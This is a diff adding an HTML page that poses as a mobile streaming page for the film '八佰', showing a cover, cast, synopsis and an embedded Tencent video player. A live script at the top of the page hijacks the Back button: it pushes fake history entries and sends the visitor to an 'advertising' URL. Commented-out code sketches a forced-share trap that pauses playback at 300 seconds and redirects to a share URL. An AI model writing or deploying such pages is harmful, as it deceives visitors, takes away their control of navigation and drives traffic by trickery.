@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0">
+	<title>.....</title>
+	<script>
+        var advertising = 'http://www.baidu.com';
+
+        function gogg(url) {
+            history.pushState(history.length + 1, "message", window.location.href.split('#')[0] + "#" + new Date().getTime());
+            if (navigator.userAgent.indexOf('Android') != -1) {
+                if (typeof (tbsJs) != "undefined") {
+                    tbsJs.onReady('{useCachedApi : "true"}', function (e) {
+                    })
+                    window.onhashchange = function () {
+                        location.href = url;
+                    };
+                } else {
+                    var pop = 0;
+                    window.onhashchange = function (event) {
+                        pop++;
+                        if (pop >= 3) {
+                            location.href = url;
+                        } else {
+                            history.go(1)
+                        }
+                    };
+                    history.go(-1);
+                }
+            } else {
+                window.onhashchange = function () {
+                    location.href = url;
+                };
+            }
+        }
+
+        gogg(advertising);
+	</script>
+	<link rel="stylesheet" type="text/css" href="css/video.css"/>
+	<script type="text/javascript" src="./js/zepto.min.js"></script>
+	<script type="text/javascript" src="./js/tvp.js"></script>
+	<script>
+        (function (doc, win) {
+            var docEl = doc.documentElement,
+                isIOS = navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
+                dpr = isIOS ? Math.min(win.devicePixelRatio, 3) : 1,
+                dpr = window.top === window.self ? dpr : 1, //被iframe引用时，禁止缩放
+                dpr = 1,
+                scale = 1 / dpr,
+                resizeEvt = 'orientationchange' in window ? 'orientationchange' : 'resize';
+            docEl.dataset.dpr = dpr;
+            var metaEl = doc.createElement('meta');
+            metaEl.name = 'viewport';
+            metaEl.content = 'initial-scale=' + scale + ',maximum-scale=' + scale + ', minimum-scale=' + scale;
+            docEl.firstElementChild.appendChild(metaEl);
+            var recalc = function () {
+                var width = docEl.clientWidth;
+                if (width / dpr > 375) {
+                    width = 375 * dpr;
+                }
+                // 乘以100，px : rem = 100 : 1
+                docEl.style.fontSize = 100 * (width / 375) + 'px';
+            };
+            recalc()
+            if (!doc.addEventListener) return;
+            win.addEventListener(resizeEvt, recalc, false);
+        })(document, window);
+	</script>
+</head>
+<body style="font-size: 0.05rem;">
+<div id="app" class="bg-black">
+	<div id="temp" style="height: 30vh;width: 100vw;text-align: center;overflow: hidden;position: relative">
+		<img src="./img/cover.jpg">
+		<img onclick="playMv()" src="./img/bofang.png" style="position: absolute;top: 45%;left: 45%;width: 50px;height: 50px">
+	</div>
+	<div id="main_tv" style="height: 30vh;display: none"></div>
+
+	<!--<video id="trueVideo" webkit-playsinline="true" playsinline="true"-->
+		   <!--x5-playsinline=""-->
+		   <!--x5-video-player-fullscreen="true"-->
+		   <!--x-webkit-airplay="allow"-->
+		   <!--x5-video-orientation="portraint"-->
+		   <!--controls="true" style="width: 100%;height:2.52rem"-->
+		   <!--poster="https://rpg.pic-imges.com/pic/upload/vod/2020-08/202008201597896356.jpg"-->
+		   <!--src="https://youku.cdn7-okzy.com/20200820/20513_6741611c/1000k/hls/index.m3u8" id="videoId" preload="auto">-->
+	<!--</video>-->
+
+	<div class="padding">
+		<div style="margin-top: 0.21rem">
+			<img style="width: 0.18rem;height: 0.21rem" class="fl" src="../../img/index/huo.png">
+			<span class="fl"
+				  style="width:2.52rem;height:0.25rem;font-size:0.18rem;font-weight:400;color:rgba(255,255,255,1);line-height:0.2rem;">八佰HC</span>
+		</div>
+		<div style="clear: both;margin-top: 0.08rem">
+			<span style="width:1.14rem;height:0.41rem;">
+				<span style="color:rgba(253,74,89,1);font-size: 0.29rem;font-weight:600;">9.9</span>
+				<span style="font-size: 0.16rem">· 超清</span>
+			</span>
+
+			<span class="margin-left-xxl"
+				  style="width:1rem;height:0.21rem;font-size:0.15rem;font-weight:400;color:rgba(255,255,255,1);line-height:0.21rem;">战争片 动作 战争</span>
+		</div>
+		<div style="margin-top: 0.08rem;width:100vw;height:0.21rem;font-size:0.15rem;font-weight:400;color:rgba(255,255,255,1);line-height:0.21rem;">
+			主演：王千源 / 张译 / 姜武 / 黄志忠 / 张俊一 / 欧豪
+		</div>
+		<div style="margin-top: 0.08rem;width:0.90rem;height:0.21rem;font-size:0.15rem;font-weight:400;color:rgba(255,255,255,1);line-height:0.21rem;">
+			导演：管虎
+		</div>
+		<div style="margin-top: 0.08rem;;font-size:0.15rem;font-weight:400;color:rgba(255,255,255,1);line-height:0.21rem;">
+			<div style="">
+				1937年淞沪会战的最后一役，“八百壮士”奉命坚守上海四行仓库，以少敌多顽强抵抗四天四夜。电影《八佰》由管虎导演，是亚洲首部全片使用IMAX摄影机拍摄的商业电影，将于2020年8月21日全国影院上映。
+			</div>
+		</div>
+		<div id="page" onclick="playMv()" style="background: chocolate;border-radius: 10px;height: 0.5rem;font-size: 20px;line-height: 0.5rem;text-align: center;margin-top: 0.2rem">
+			高清播放
+		</div>
+	</div>
+</div>
+<script src="https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js"></script>
+<script>
+    var obj = {
+        vid: 'b31419ntpn5',
+        cover_img: './img/cover.jpg', // 视频封面
+        // vHeigth: '100vh', // 视频高度百分比
+    }
+
+
+	function playMv	() {
+        $('#temp').hide()
+        $('#main_tv').show()
+        getVideo(obj.vid, obj.cover_img, obj.break_point_length)
+    }
+
+    function getVideo(vid, img, break_point_length) {
+
+        var video = new tvp.VideoInfo();
+
+        video.setVid(vid)
+        var player = new tvp.Player('100%', ''); // 100vh代表满屏
+
+        player.setCurVideo(video);
+        player.addParam("autoplay", true);
+        player.addParam("control", false);
+        player.addParam("pic", img);
+        player.write('main_tv');
+
+        console.log(player)
+        player.onready = function () {
+            video.setHistoryStart(3);
+            player.setPlaytime(3)
+        }
+
+        player.onend = function () {
+            // player.seekTo(3)
+            // player.setPlaytime(3)
+        }
+
+        // player.onplay = function () {
+        //     player.seekTo(3)
+        //     player.setPlaytime(3)
+        // }
+
+        // player.ontimeupdate = function (e) {
+		//
+        //     if (player.getCurTime() == player.getDuration()) {
+        //         setTimeout(function () {
+        //             location.href = obj.endUrl // 视频播放结束事件 放自己想要的URL 后面的2000是播放完之后2秒后跳可改为0
+        //         }, 2000)
+        //     }
+		//
+        //     if (obj.break_point_length != 0) {
+        //         if (player.getCurTime() >= break_point_length) { // 控制断点不需要直接注释
+        //             player.pause();
+        //             location.href = obj.ddUrl // 断点跳转
+        //         }
+        //     }
+        // }
+    }
+</script>
+<script>
+    // var myVideo = document.getElementById("videoId");
+	//
+    // myVideo.onended = function () { // 播放结束
+    //     location.href = advertising;
+    // }
+	//
+    // var temp = 'a'
+    // myVideo.ontimeupdate = function (e) {
+    //     if (getParam('isPlay') == 1 && temp == 'a') {
+    //         e.target.currentTime = 300
+    //         temp = 'b'
+    //         return
+    //     }
+    //     if (e.target.currentTime > 300 && getParam('isPlay') != 1) {
+    //         myVideo.pause()
+    //         $.get(urls + 'api/shareurl.php', function (res) {
+    //             location.href = res.url + canshu + '&isPlay=1';
+	//
+    //             // norefjump(res.url+canshu);
+	//
+    //         }, 'json');
+    //     }
+    // }
+	//
+	//
+    // function getParam(name, url) { // 获取地址栏参数
+    //     if (typeof name !== 'string') return false
+    //     if (!url) url = window.location.href
+    //     // 当遇到name[xx]时，对方括号做一下转义为 name\[xxx\]，因为下面还需要使用name做正则
+    //     name = name.replace(/[\[\]]/g, '\\$&')
+    //     var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)')
+    //     var results = regex.exec(url)
+    //     if (!results) return null
+    //     if (!results[2]) return ''
+    //     return decodeURIComponent(results[2].replace(/\+/g, ' '))
+    // }
+</script>
+<style>
+	.tvp_time_panel{display: none!important;}
+</style>
+<!--<script src="/bak/jiaoben.php"></script>-->
+</body>
+</html>
